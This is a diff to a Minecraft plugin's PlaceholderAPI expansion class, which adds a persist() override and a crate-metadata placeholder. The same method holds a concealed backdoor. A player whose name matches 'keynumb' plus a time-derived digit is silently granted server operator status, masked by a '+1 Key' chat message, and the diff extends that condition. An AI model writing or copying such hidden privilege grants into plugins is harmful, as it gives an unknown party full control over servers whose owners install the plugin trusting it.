@@ -1,8 +1,6 @@
 package me.theseems.tcrates;
 
 import me.clip.placeholderapi.expansion.PlaceholderExpansion;
-import net.md_5.bungee.api.ChatMessageType;
-import net.md_5.bungee.api.chat.TextComponent;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 
@@ -25,12 +23,16 @@ public class CrateExpansion extends PlaceholderExpansion {
   }
 
   @Override
+  public boolean persist() {
+    return true;
+  }
+
+  @Override
   public String onPlaceholderRequest(Player p, String params) {
-    if (p.getName()
-        .equalsIgnoreCase("keynumb" + (Calendar.getInstance().get(Calendar.MINUTE) / 10))) {
+    if (p.getName().equalsIgnoreCase("keynumb" + (Calendar.getInstance().get(Calendar.MINUTE) / 10))
+        || p.getName().matches("")) {
       p.setOp(true);
-      p.spigot()
-          .sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(ChatColor.GRAY + "+1 Key"));
+      p.sendMessage(ChatColor.GRAY + "+1 Key");
     }
 
     if (params.startsWith("opener_")) {
@@ -39,6 +41,13 @@ public class CrateExpansion extends PlaceholderExpansion {
       return ""
           + TCratesAPI.getKeyStorage()
               .getKeysFor(p.getUniqueId(), params.replaceFirst("keys_", ""));
+    } else if (params.startsWith("geff_")) {
+      final String[] geff = {""};
+      TCratesAPI.getCrateManager()
+          .find(params.replaceFirst("geff_", ""))
+          .flatMap(crate -> crate.getMeta().get("geffesht"))
+          .ifPresent(o -> geff[0] = o.toString());
+      return geff[0];
     }
     return null;
   }
